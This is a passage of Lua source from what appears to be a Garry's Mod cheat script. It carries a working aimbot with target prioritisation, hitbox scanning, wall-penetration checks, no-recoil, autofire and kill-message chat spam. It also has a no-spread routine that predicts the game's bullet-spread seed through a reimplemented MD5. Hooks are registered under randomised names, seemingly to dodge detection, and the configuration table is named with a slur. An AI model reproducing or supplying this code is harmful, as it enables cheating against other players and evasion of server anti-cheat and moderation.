if p:EntIndex()==qwe.entindex_attacker then 
atk=p:Nick()
killah=p
if p:GetActiveWeapon()&& p:GetActiveWeapon():IsValid()then 
wep=p:GetActiveWeapon():GetPrintName() 
end 
end 
end
if atk==ply then return end
zapiclogs("kill",atk.." killed "..ply.." with "..wep)
if ply==LocalPlayer():Nick()then
if gay["WH_NOIFICATION_DAMAGEDMEBY"]then
hacka.onitify("You killed by "..atk.." with "..wep)
end
else
if gay["SPAM_KILLSAY_ENABLED"] then
xpcall(function()
if !gay["SPAM_KILLSAY_OOC"] then
RunConsoleCommand("say", gay["SPAM_KILLSAY"][math.random(1, #gay["SPAM_KILLSAY"])])
else
RunConsoleCommand("say", "/ooc " .. gay["SPAM_KILLSAY"][math.random(1, #gay["SPAM_KILLSAY"])])
end
end,function()end)
end
end
end)

local function FixMovement(pCmd)
local vec = Vector(cm.GetForwardMove(pCmd), cm.GetSideMove(pCmd), 0)
local vel = math.sqrt(vec.x*vec.x + vec.y*vec.y)
local mang = vm.Angle(vec)
local yaw = _cm_GetViewAngles(pCmd).y - fa.y + mang.y
if (((_cm_GetViewAngles(pCmd).p+90)%360) > 180) then
yaw = 180 - yaw
end
yaw = ((yaw + 180)%360)-180
pCmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
pCmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
end

local function NormalizeAngle(ang)
ang.x = math.NormalizeAngle(ang.x);
ang.p = math.Clamp(ang.p, -89, 89);
end

local function hitis(v,pos)
local traceTab = {start=_pm_GetShootPos(me),endpos=pos,mask=MASK_SHOT,filter=function(player)return!player:IsPlayer()end}
local trace = util.TraceLine( traceTab )
return !trace.Hit
end

local bones={0,16,4,1,5,2,6,3,15,11,7,12,8,13,9}

local dists = {};

local function GetPos(v)
if(gay["AIM_HITBOX"]=="Hitscan")then 
for i,j in next,bones do 
Hitscan=em.GetHitBoxBone(v,bones[i],0)
if Hitscan!=nil then 
HitscanPos=em.GetBonePosition(v,Hitscan)
HitMin,HitMax=em.GetHitBoxBounds(v,bones[i],0)
if hitis(v,HitscanPos+(HitMin+HitMax)/2)then 
return HitscanPos+(HitMin+HitMax)/2 
end 
end 
end 
end
if(gay["AIM_HITBOX"]=="Body") then 
return( _em_LocalToWorld(v, em.OBBCenter(v)) ); 
end
local eyes = _em_LookupAttachment(v, "eyes");
if(!eyes) then return( _em_LocalToWorld(v, em.OBBCenter(v)) ); end
local pos = em.GetAttachment(v, eyes);
if(!pos) then return( _em_LocalToWorld(v, em.OBBCenter(v)) ); end
return(pos.Pos);
end

local penvalues = {["SniperPenetratedRound"] = 20,["Pistol"] = 9,["357"] = 12,["SMG1"] = 14,["AR2"] = 16,["Buckshot"] = 5}
local function M9KAutowall(ent)
local w = _pm_GetActiveWeapon(me);
if !_em_IsValid(ent) && !_em_IsPlayer(ent)then return end
local trace = util.TraceLine({mask = MASK_ALL, start = _pm_GetShootPos(me), endpos = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1")), filter = {me, ent}})
local wall = util.TraceLine({mask = MASK_SHOT, start = _pm_GetShootPos(me), endpos = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1")), filter = {me, ent}})
local wall2 = util.TraceLine({mask = MASK_SHOT, start = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1")), endpos = _pm_GetShootPos(me), filter = {me, ent}})
if trace.Fraction == 1 || (IsValid(w) && wall.HitPos:Distance(wall2.HitPos) < penvalues[game.GetAmmoName(w:GetPrimaryAmmoType())]) then
return true
end
end

local function CheckFov(f)
if !f then return end
if gay["AIM_FOV"]==0 then
return true
end
local g=fa
local h=vm.Angle(_em_GetPos(f)-_em_GetPos(me))
local i=math.abs(math.NormalizeAngle(g.y-h.y))
local j=math.abs(math.NormalizeAngle(g.ply-h.ply))
if i<gay["AIM_FOV"]/3 && j<gay["AIM_FOV"]/3 then
return true 
end
return false 
end

local function Valid(v)
if(!v || !_em_IsValid(v) || v == me || _em_Health(v) < 1 || pm.HasGodMode(v) || _em_IsDormant(v) || _pm_Team(v) == 1002 || !CheckFov(v)) then return false; end
if gay["FRIENDLIST"][_pm_SteamID(v)] then return false; end
if gay["TEAMLIST"][_team_GetName(pm.Team(v))] then return false; end
if gay["RANKLIST"][_pm_GetUserGroup(v)] then return false; end
local tr = {
start = _em_EyePos(me),
endpos = GetPos(v),
mask = MASK_SHOT,
filter = {me, v},
};
local wep = _pm_GetActiveWeapon(me)
if(util.TraceLine(tr).Fraction == 1) then
return true
elseif (gay["AIM_AUTOWALL"] and wep and _em_IsValid(wep) and wep.BulletPenetrate) then
return M9KAutowall(v)
end
return false
end

local function gettarget()
local opt = gay["AIM_PRIORITY"]
if(opt == "Closest Distance") then
dists = {};
for k,v in next, player.GetAll() do
if(!Valid(v)) then continue; end
dists[#dists + 1] = { _vm_Distance( _em_GetPos(v), _em_GetPos(me) ), v };
end
table.sort(dists, function(a, b)
return(a[1] < b[1]);
end);
aimtarget = dists[1] && dists[1][2] || nil;
elseif(opt == "Least Health") then
dists = {};
for k,v in next, player.GetAll() do
if(!Valid(v)) then continue; end
dists[#dists + 1] = { _em_Health(v), v };
end
table.sort(dists, function(a, b)
return(a[1] < b[1]);
end);
aimtarget = dists[1] && dists[1][2] || nil;
elseif(opt == "Field of View") then
dists = {}
local x, y = ScrW(), ScrH()
local AngA, AngB = 0
for k, v in next, player.GetAll() do
if(!Valid(v)) then continue end
local EyePos = vm.ToScreen(em.EyePos(v))
dists[#dists + 1] = {math.Dist(x / 2, y / 2, EyePos.x, EyePos.y), v}
end
table.sort(dists, function(a, b)
return(a[1] < b[1])
end)
aimtarget = dists[1] && dists[1][2] || nil
end
end

local cones = {};
local nullvec = Vector() * -1;
local IsFirstTimePredicted = IsFirstTimePredicted;
local CurTime = CurTime;
local servertime = 0;
local bit = Copy(bit);


hook.Add("Move", "]]..b.randomforhook..[[", function()
if(!IsFirstTimePredicted()) then return; end
servertime = engine.TickCount()*engine.TickInterval();
end);

GAMEMODE["EntityFireBullets"] = function(self, p, data)
local w = _pm_GetActiveWeapon(me);
local Spread = data.Spread * -1;
if(!w || !_em_IsValid(w) || cones[em.GetClass(w)] == Spread || Spread == nullvec) then return; end
cones[em.GetClass(w)] = Spread;
end

local a = {}
a.ct = {
    0xd76aa478,
    0xe8c7b756,
    0x242070db,
    0xc1bdceee,
    0xf57c0faf,
    0x4787c62a,
    0xa8304613,
    0xfd469501,
    0x698098d8,
    0x8b44f7af,
    0xffff5bb1,
    0x895cd7be,
    0x6b901122,
    0xfd987193,
    0xa679438e,
    0x49b40821,
    0xf61e2562,
    0xc040b340,
    0x265e5a51,
    0xe9b6c7aa,
    0xd62f105d,
    0x02441453,
    0xd8a1e681,
    0xe7d3fbc8,
    0x21e1cde6,
    0xc33707d6,
    0xf4d50d87,
    0x455a14ed,
    0xa9e3e905,
    0xfcefa3f8,
    0x676f02d9,
    0x8d2a4c8a,
    0xfffa3942,
    0x8771f681,
    0x6d9d6122,
    0xfde5380c,
    0xa4beea44,
    0x4bdecfa9,
    0xf6bb4b60,
    0xbebfbc70,
    0x289b7ec6,
    0xeaa127fa,
    0xd4ef3085,
    0x04881d05,
    0xd9d4d039,
    0xe6db99e5,
    0x1fa27cf8,
    0xc4ac5665,
    0xf4292244,
    0x432aff97,
    0xab9423a7,
    0xfc93a039,
    0x655b59c3,
    0x8f0ccc92,
    0xffeff47d,
    0x85845dd1,
    0x6fa87e4f,
    0xfe2ce6e0,
    0xa3014314,
    0x4e0811a1,
    0xf7537e82,
    0xbd3af235,
    0x2ad7d2bb,
    0xeb86d391,
    0x67452301,
    0xefcdab89,
    0x98badcfe,
    0x10325476
}
local b = function(c, d, e)
    return bit.bor(bit.band(c, d), bit.band(-c - 1, e))
end
local f = function(c, d, e)
    return bit.bor(bit.band(c, e), bit.band(d, -e - 1))
end
local g = function(c, d, e)
    return bit.bxor(c, bit.bxor(d, e))
end
local h = function(c, d, e)
    return bit.bxor(d, bit.bor(c, -e - 1))
end
local e = function(b, i, j, k, l, c, m, n)
    i = bit.band(i + b(j, k, l) + c + n, 0xffffffff)
    return bit.bor(bit.lshift(bit.band(i, bit.rshift(0xffffffff, m)), m), bit.rshift(i, 32 - m)) + j
end
local o = 2 ^ 31
local p = 2 ^ 32
function a.fix(i)
    if i > o then
        return i - p
    end
    return i
end
function a.trm(q, r, s, t, u)
    local i, j, k, l = q, r, s, t
    i = e(b, i, j, k, l, u[0], 7, a.ct[1])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(b, l, i, j, k, u[1], 12, a.ct[2])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(b, k, l, i, j, u[2], 17, a.ct[3])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(b, j, k, l, i, u[3], 22, a.ct[4])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(b, i, j, k, l, u[4], 7, a.ct[5])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(b, l, i, j, k, u[5], 12, a.ct[6])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(b, k, l, i, j, u[6], 17, a.ct[7])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(b, j, k, l, i, u[7], 22, a.ct[8])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(b, i, j, k, l, u[8], 7, a.ct[9])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(b, l, i, j, k, u[9], 12, a.ct[10])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(b, k, l, i, j, u[10], 17, a.ct[11])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(b, j, k, l, i, u[11], 22, a.ct[12])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(b, i, j, k, l, u[12], 7, a.ct[13])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(b, l, i, j, k, u[13], 12, a.ct[14])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(b, k, l, i, j, u[14], 17, a.ct[15])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(b, j, k, l, i, u[15], 22, a.ct[16])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(f, i, j, k, l, u[1], 5, a.ct[17])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(f, l, i, j, k, u[6], 9, a.ct[18])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(f, k, l, i, j, u[11], 14, a.ct[19])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(f, j, k, l, i, u[0], 20, a.ct[20])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(f, i, j, k, l, u[5], 5, a.ct[21])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(f, l, i, j, k, u[10], 9, a.ct[22])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(f, k, l, i, j, u[15], 14, a.ct[23])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(f, j, k, l, i, u[4], 20, a.ct[24])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(f, i, j, k, l, u[9], 5, a.ct[25])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(f, l, i, j, k, u[14], 9, a.ct[26])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(f, k, l, i, j, u[3], 14, a.ct[27])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(f, j, k, l, i, u[8], 20, a.ct[28])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(f, i, j, k, l, u[13], 5, a.ct[29])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(f, l, i, j, k, u[2], 9, a.ct[30])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(f, k, l, i, j, u[7], 14, a.ct[31])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(f, j, k, l, i, u[12], 20, a.ct[32])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(g, i, j, k, l, u[5], 4, a.ct[33])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(g, l, i, j, k, u[8], 11, a.ct[34])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(g, k, l, i, j, u[11], 16, a.ct[35])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(g, j, k, l, i, u[14], 23, a.ct[36])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(g, i, j, k, l, u[1], 4, a.ct[37])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(g, l, i, j, k, u[4], 11, a.ct[38])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(g, k, l, i, j, u[7], 16, a.ct[39])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(g, j, k, l, i, u[10], 23, a.ct[40])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(g, i, j, k, l, u[13], 4, a.ct[41])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(g, l, i, j, k, u[0], 11, a.ct[42])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(g, k, l, i, j, u[3], 16, a.ct[43])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(g, j, k, l, i, u[6], 23, a.ct[44])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(g, i, j, k, l, u[9], 4, a.ct[45])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(g, l, i, j, k, u[12], 11, a.ct[46])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(g, k, l, i, j, u[15], 16, a.ct[47])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(g, j, k, l, i, u[2], 23, a.ct[48])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(h, i, j, k, l, u[0], 6, a.ct[49])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(h, l, i, j, k, u[7], 10, a.ct[50])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(h, k, l, i, j, u[14], 15, a.ct[51])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(h, j, k, l, i, u[5], 21, a.ct[52])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(h, i, j, k, l, u[12], 6, a.ct[53])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(h, l, i, j, k, u[3], 10, a.ct[54])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(h, k, l, i, j, u[10], 15, a.ct[55])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(h, j, k, l, i, u[1], 21, a.ct[56])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(h, i, j, k, l, u[8], 6, a.ct[57])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(h, l, i, j, k, u[15], 10, a.ct[58])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(h, k, l, i, j, u[6], 15, a.ct[59])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(h, j, k, l, i, u[13], 21, a.ct[60])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    i = e(h, i, j, k, l, u[4], 6, a.ct[61])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    l = e(h, l, i, j, k, u[11], 10, a.ct[62])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    k = e(h, k, l, i, j, u[2], 15, a.ct[63])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    j = e(h, j, k, l, i, u[9], 21, a.ct[64])
    i = a.fix(i)
    j = a.fix(j)
    k = a.fix(k)
    l = a.fix(l)
    return q + i, r + j, s + k, t + l
end
function a.Psm(v)
    local i, j, k, l = a.fix(a.ct[65]), a.fix(a.ct[66]), a.fix(a.ct[67]), a.fix(a.ct[68])
    local w = {}
    for h = 0, 15 do
        w[h] = 0
    end
    w[0] = v
    w[1] = 128
    w[14] = 32
    local i, j, k, l = a.trm(i, j, k, l, w)
    return bit.rshift(a.fix(j), 16) % 256
end
local x = {
    [0] = {-0.492036, 0.286111},
    [1] = {-0.492036, 0.286111},
    [2] = {-0.255320, 0.128480},
    [3] = {0.456165, 0.356030},
    [4] = {-0.361731, 0.406344},
    [5] = {-0.146730, 0.834589},
    [6] = {-0.253288, -0.421936},
    [7] = {-0.448694, 0.111650},
    [8] = {-0.880700, 0.904610},
    [9] = {-0.379932, 0.138833},
    [10] = {0.502579, -0.494285},
    [11] = {-0.263847, -0.594805},
    [12] = {0.818612, 0.090368},
    [13] = {-0.063552, 0.044356},
    [14] = {0.490455, 0.304820},
    [15] = {-0.192024, 0.195162},
    [16] = {-0.139421, 0.857106},
    [17] = {0.715745, 0.336956},
    [18] = {-0.150103, -0.044842},
    [19] = {-0.176531, 0.275787},
    [20] = {0.155707, -0.152178},
    [21] = {-0.136486, -0.591896},
    [22] = {-0.021022, -0.761979},
    [23] = {-0.166004, -0.733964},
    [24] = {-0.102439, -0.132059},
    [25] = {-0.607531, -0.249979},
    [26] = {-0.500855, -0.185902},
    [27] = {-0.080884, 0.516556},
    [28] = {-0.003334, 0.138612},
    [29] = {-0.546388, -0.000115},
    [30] = {-0.228092, -0.018492},
    [31] = {0.542539, 0.543196},
    [32] = {-0.355162, 0.197473},
    [33] = {-0.041726, -0.015735},
    [34] = {-0.713230, -0.551701},
    [35] = {-0.045056, 0.090208},
    [36] = {0.061028, 0.417744},
    [37] = {-0.171149, -0.048811},
    [38] = {0.241499, 0.164562},
    [39] = {-0.129817, -0.111200},
    [40] = {0.007366, 0.091429},
    [41] = {-0.079268, -0.008285},
    [42] = {0.010982, -0.074707},
    [43] = {-0.517782, -0.682470},
    [44] = {-0.663822, -0.024972},
    [45] = {0.058213, -0.078307},
    [46] = {-0.302041, -0.132280},
    [47] = {0.217689, -0.209309},
    [48] = {-0.143615, 0.830349},
    [49] = {0.270912, 0.071245},
    [50] = {-0.258170, -0.598358},
    [51] = {0.099164, -0.257525},
    [52] = {-0.214676, -0.595918},
    [53] = {-0.427053, -0.523764},
    [54] = {-0.585472, 0.088522},
    [55] = {0.564305, -0.533822},
    [56] = {-0.387545, -0.422206},
    [57] = {0.690505, -0.299197},
    [58] = {0.475553, 0.169785},
    [59] = {0.347436, 0.575364},
    [60] = {-0.069555, -0.103340},
    [61] = {0.286197, -0.618916},
    [62] = {-0.505259, 0.106581},
    [63] = {-0.420214, -0.714843},
    [64] = {0.032596, -0.401891},
    [65] = {-0.238702, -0.087387},
    [66] = {0.714358, 0.197811},
    [67] = {0.208960, 0.319015},
    [68] = {-0.361140, 0.222130},
    [69] = {-0.133284, -0.492274},
    [70] = {0.022824, -0.133955},
    [71] = {-0.100850, 0.271962},
    [72] = {-0.050582, -0.319538},
    [73] = {0.577980, 0.095507},
    [74] = {0.224871, 0.242213},
    [75] = {-0.628274, 0.097248},
    [76] = {0.184266, 0.091959},
    [77] = {-0.036716, 0.474259},
    [78] = {-0.502566, -0.279520},
    [79] = {-0.073201, -0.036658},
    [80] = {0.339952, -0.293667},
    [81] = {0.042811, 0.130387},
    [82] = {0.125881, 0.007040},
    [83] = {0.138374, -0.418355},
    [84] = {0.261396, -0.392697},
    [85] = {-0.453318, -0.039618},
    [86] = {0.890159, -0.335165},
    [87] = {0.466437, -0.207762},
    [88] = {0.593253, 0.418018},
    [89] = {0.566934, -0.643837},
    [90] = {0.150918, 0.639588},
    [91] = {0.150112, 0.215963},
    [92] = {-0.130520, 0.324801},
    [93] = {-0.369819, -0.019127},
    [94] = {-0.038889, -0.650789},
    [95] = {0.490519, -0.065375},
    [96] = {-0.305940, 0.454759},
    [97] = {-0.521967, -0.550004},
    [98] = {-0.040366, 0.683259},
    [99] = {0.137676, -0.376445},
    [100] = {0.839301, 0.085979},
    [101] = {-0.319140, 0.481838},
    [102] = {0.201437, -0.033135},
    [103] = {0.384637, -0.036685},
    [104] = {0.598419, 0.144371},
    [105] = {-0.061424, -0.608645},
    [106] = {-0.065337, 0.308992},
    [107] = {-0.029356, -0.634337},
    [108] = {0.326532, 0.047639},
    [109] = {0.505681, -0.067187},
    [110] = {0.691612, 0.629364},
    [111] = {-0.038588, -0.635947},
    [112] = {0.637837, -0.011815},
    [113] = {0.765338, 0.563945},
    [114] = {0.213416, 0.068664},
    [115] = {-0.576581, 0.554824},
    [116] = {0.246580, 0.132726},
    [117] = {0.385548, -0.070054},
    [118] = {0.538735, -0.291010},
    [119] = {0.609944, 0.590973},
    [120] = {-0.463240, 0.010302},
    [121] = {-0.047718, 0.741086},
    [122] = {0.308590, -0.322179},
    [123] = {-0.291173, 0.256367},
    [124] = {0.287413, -0.510402},
    [125] = {0.864716, 0.158126},
    [126] = {0.572344, 0.561319},
    [127] = {-0.090544, 0.332633},
    [128] = {0.644714, 0.196736},
    [129] = {-0.204198, 0.603049},
    [130] = {-0.504277, -0.641931},
    [131] = {0.218554, 0.343778},
    [132] = {0.466971, 0.217517},
    [133] = {-0.400880, -0.299746},
    [134] = {-0.582451, 0.591832},
    [135] = {0.421843, 0.118453},
    [136] = {-0.215617, -0.037630},
    [137] = {0.341048, -0.283902},
    [138] = {-0.246495, -0.138214},
    [139] = {0.214287, -0.196102},
    [140] = {0.809797, -0.498168},
    [141] = {-0.115958, -0.260677},
    [142] = {-0.025448, 0.043173},
    [143] = {-0.416803, -0.180813},
    [144] = {-0.782066, 0.335273},
    [145] = {0.192178, -0.151171},
    [146] = {0.109733, 0.165085},
    [147] = {-0.617935, -0.274392},
    [148] = {0.283301, 0.171837},
    [149] = {-0.150202, 0.048709},
    [150] = {-0.179954, -0.288559},
    [151] = {-0.288267, -0.134894},
    [152] = {-0.049203, 0.231717},
    [153] = {-0.065761, 0.495457},
    [154] = {0.082018, -0.457869},
    [155] = {-0.159553, 0.032173},
    [156] = {0.508305, -0.090690},
    [157] = {0.232269, -0.338245},
    [158] = {-0.374490, -0.480945},
    [159] = {-0.541244, 0.194144},
    [160] = {-0.040063, -0.073532},
    [161] = {0.136516, -0.167617},
    [162] = {-0.237350, 0.456912},
    [163] = {-0.446604, -0.494381},
    [164] = {0.078626, -0.020068},
    [165] = {0.163208, 0.600330},
    [166] = {-0.886186, -0.345326},
    [167] = {-0.732948, -0.689349},
    [168] = {0.460564, -0.719006},
    [169] = {-0.033688, -0.333340},
    [170] = {-0.325414, -0.111704},
    [171] = {0.010928, 0.723791},
    [172] = {0.713581, -0.077733},
    [173] = {-0.050912, -0.444684},
    [174] = {-0.268509, 0.381144},
    [175] = {-0.175387, 0.147070},
    [176] = {-0.429779, 0.144737},
    [177] = {-0.054564, 0.821354},
    [178] = {0.003205, 0.178130},
    [179] = {-0.552814, 0.199046},
    [180] = {0.225919, -0.195013},
    [181] = {0.056040, -0.393974},
    [182] = {-0.505988, 0.075184},
    [183] = {-0.510223, 0.156271},
    [184] = {-0.209616, 0.111174},
    [185] = {-0.605132, -0.117104},
    [186] = {0.412433, -0.035510},
    [187] = {-0.573947, -0.691295},
    [188] = {-0.712686, 0.021719},
    [189] = {-0.643297, 0.145307},
    [190] = {0.245038, 0.343062},
    [191] = {-0.235623, -0.159307},
    [192] = {-0.834004, 0.088725},
    [193] = {0.121377, 0.671713},
    [194] = {0.528614, 0.607035},
    [195] = {-0.285699, -0.111312},
    [196] = {0.603385, 0.401094},
    [197] = {0.632098, -0.439659},
    [198] = {0.681016, -0.242436},
    [199] = {-0.261709, 0.304265},
    [200] = {-0.653737, -0.199245},
    [201] = {-0.435512, -0.762978},
    [202] = {0.701105, 0.389527},
    [203] = {0.093495, -0.148484},
    [204] = {0.715218, 0.638291},
    [205] = {-0.055431, -0.085173},
    [206] = {-0.727438, 0.889783},
    [207] = {-0.007230, -0.519183},
    [208] = {-0.359615, 0.058657},
    [209] = {0.294681, 0.601155},
    [210] = {0.226879, -0.255430},
    [211] = {-0.307847, -0.617373},
    [212] = {0.340916, -0.780086},
    [213] = {-0.028277, 0.610455},
    [214] = {-0.365067, 0.323311},
    [215] = {0.001059, -0.270451},
    [216] = {0.304025, 0.047478},
    [217] = {0.297389, 0.383859},
    [218] = {0.288059, 0.262816},
    [219] = {-0.889315, 0.533731},
    [220] = {0.215887, 0.678889},
    [221] = {0.287135, 0.343899},
    [222] = {0.423951, 0.672285},
    [223] = {0.411912, -0.812886},
    [224] = {0.081615, -0.497358},
    [225] = {-0.051963, -0.117891},
    [226] = {-0.062387, 0.331698},
    [227] = {0.020458, -0.734125},
    [228] = {-0.160176, 0.196321},
    [229] = {0.044898, -0.024032},
    [230] = {-0.153162, 0.930951},
    [231] = {-0.015084, 0.233476},
    [232] = {0.395043, 0.645227},
    [233] = {-0.232095, 0.283834},
    [234] = {-0.507699, 0.317122},
    [235] = {-0.606604, -0.227259},
    [236] = {0.526430, -0.408765},
    [237] = {0.304079, 0.135680},
    [238] = {-0.134042, 0.508741},
    [239] = {-0.276770, 0.383958},
    [240] = {-0.298963, -0.233668},
    [241] = {0.171889, 0.697367},
    [242] = {-0.292571, -0.317604},
    [243] = {0.587806, 0.115584},
    [244] = {-0.346690, -0.098320},
    [245] = {0.956701, -0.040982},
    [246] = {0.040838, 0.595304},
    [247] = {0.365201, -0.519547},
    [248] = {-0.397271, -0.090567},
    [249] = {-0.124873, -0.356800},
    [250] = {-0.122144, 0.617725},
    [251] = {0.191266, -0.197764},
    [252] = {-0.178092, 0.503667},
    [253] = {0.103221, 0.547538},
    [254] = {0.019524, 0.621226},
    [255] = {0.663918, -0.573476}
}
local function enginepreduction(b, c, d)
    local e = b:CommandNumber()
    local f = a.Psm(e)
    local g = x[f][1]
    local h = x[f][2]
    local i = c:Forward()
    local j = c:Right()
    local k = c:Up()
    return i + g * d.x * j + h * d.y * k
end

local function GetAngle(ang)
if(gay["AIM_NORECOIL"])then 
return ang - _pm_GetPunchAngle(me); 
end
return ang;
end

local function PredictSpread(ucmd, ang, a)
local w = _pm_GetActiveWeapon(me);
local cone = w.CurCone
local base = w.Base
if(!w || !_em_IsValid(w) || !cones[em.GetClass(w)] && !cone || !gay["AIM_NOSPREAD"]) then return am.Forward(ang); end
local cons = cones[em.GetClass(w)];
local ang = (w.Primary && w.Primary.KickHorizontal)&& ang || GetAngle(ang)
if cone then
if base=="fas2_base"then
math.randomseed(servertime)
else
math.randomseed(cm.CommandNumber(ucmd))
end
return(ang-Angle(math.Rand(-cone,cone),math.Rand(-cone,cone),0)*25):Forward()
end
if cons then
if gay["AIM_NORECOIL"] && a == 1 && w.Primary && w.Primary.KickHorizontal then
local anglo = Angle(math.Rand(-w.Primary.KickDown,-w.Primary.KickUp), math.Rand(-w.Primary.KickHorizontal,w.Primary.KickHorizontal), 0)
local eyes = ang
eyes.pitch = eyes.pitch - (anglo.pitch/3)
eyes.yaw = eyes.yaw - (anglo.yaw/3)
if GetConVar("M9KDynamicRecoil"):GetBool() then
ang=eyes
end
end
return(enginepreduction(ucmd, ang, cons));
end
end

local function Autofire(ucmd)
if ucmd:TickCount()%2==0 then
ucmd:SetButtons(bit.bor(ucmd:GetButtons(),IN_ATTACK))
end
end

local function PredictPos(pos)
local myvel = _em_GetVelocity(me)
local pos = pos - (myvel * engine.TickInterval()); 
return pos;
end

local function Keycheck(a)
if _pm_IsTyping(me)then return false end
if _input_IsKeyDown(a)|| input.IsMouseDown(a)then
return true
end
return false
end

local function SmoothAim(ang) 
if(gay["AIM_SMOOTHING"] > 0) then
ang.y = math.NormalizeAngle(ang.y) 
ang.p = math.NormalizeAngle(ang.p) 
eyeang = _em_EyeAngles(me) 
local smooth = gay["AIM_SMOOTHING"]
